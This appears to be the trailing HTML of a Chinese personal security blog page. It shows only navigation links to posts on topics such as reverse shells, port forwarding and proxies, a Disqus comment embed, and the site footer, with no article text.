                            <a href="/2018/01/27/hidden-the-network/">阻碍获取真实网络指纹
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2018/01/04/command-and-control-images/">command-and-control-images
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/12/27/open-RDP/">开启RDP
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/11/30/Test-LAB-11/">TEST LAB 11
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/11/29/proxy/">代理
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
        
            </ul>
        

        <div class="post-recent">
    <div class="pre">
        
        <p><strong>上一篇</strong> <a href="/2017/11/27/reverse-shell/">获取shell</a></p>
        
    </div>
    <div class="nex">

        
        <p><strong>下一篇</strong> <a href="/2017/11/29/port-fowarding-and-socks-proxy/">Socks端口转发和Socks端口代理</a></p>
        
    </div>
</div>


        <h2 id="comments">Comments</h2>
        


<div id="disqus_thread"></div>
<script>
    /**
     * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
     * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
     */

    var disqus_config = function() {
        this.page.url = 'http://localhost:4000/2017/11/29/port-forwarding/'; // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = 'http://localhost:4000/2017/11/29/port-forwarding/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };

    (function() { // DON'T EDIT BELOW THIS LINE
        var d = document,
            s = d.createElement('script');

        s.src = '//http-b404-xyz.disqus.com/embed.js';

        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>




    </div>
    <button class="anchor"><i class="fa fa-anchor"></i></button>
    <div class="right">
        <div class="wrap">

            <!-- Content -->
            <div class="side content">
                <div>
                    Content
                </div>
                <ul id="content-side" class="content-ul">
                    
                    <li><a href="#similar_posts">Similar Posts</a></li>
                    
                    <li><a href="#comments">Comments</a></li>
                </ul>
            </div>
            <!-- 其他div框放到这里 -->
            <!-- <div class="side">bbbb</div> -->
        </div>
    </div>
</div>
<script>
/**
 * target _blank
 */
(function() {
    var aTags = document.querySelectorAll('article a:not([id])')
    for (var i = 0; i < aTags.length; i++) {
        aTags[i].setAttribute('target', '_blank')
    }
}());
</script>
<script src="/js/pageContent.js " charset="utf-8"></script>


    <footer class="site-footer">


    <div class="wrapper">

        <p class="description">
             The quieter you become, the more you can hear. 
        </p>

        <br>
        <p class="contact">
             
            <a href="https://github.com/9jan" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
            <a href="mailto:jirairya404@gmail.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>        
            
        </p>
        <!--
        <p>
            本站总访问量<span id="busuanzi_value_site_pv"></span>次，本站访客数<span id="busuanzi_value_site_uv"></span>人次，本文总阅读量<span id="busuanzi_value_page_pv"></span>次
        </p>
    -->
        <p class="power">
            <span>
                Site powered by <a href="https://jekyllrb.com/">Jekyll</a>
            </span>
        </p>
    </div>
</footer>
<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <div class="back-to-top">
    <a href="#top" data-scroll>
        <i class="fa fa-arrow-up" aria-hidden="true"></i>
    </a>
</div>

    <script src=" /js/main.js " charset="utf-8"></script>
    <script src=" /js/smooth-scroll.min.js " charset="utf-8"></script>
    <script type="text/javascript">
      smoothScroll.init({
        speed: 500, // Integer. How fast to complete the scroll in milliseconds
        easing: 'easeInOutCubic', // Easing pattern to use
        offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
      });
    </script>
    <!-- <script src=" /js/scroll.min.js " charset="utf-8"></script> -->
  </body>

</html>
